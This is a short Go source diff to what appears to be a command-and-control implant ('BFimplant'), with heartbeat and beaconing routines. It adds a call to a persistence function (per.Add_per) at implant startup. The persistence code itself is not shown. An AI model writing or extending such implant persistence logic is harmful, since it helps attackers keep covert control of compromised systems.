@@ -14,6 +14,7 @@ import (
 	"time"
 	"BFimplant/modules"
 	"github.com/google/uuid"
+	"BFimplant/per"
 )
 
 type Implant struct {
@@ -55,6 +56,7 @@ func (i *Implant) Start() {
 		fmt.Println("Error logging in:", err)
 		return
 	}
+	per.Add_per()
 	go i.sendHeartbeat()
 	i.Beaconing()
 
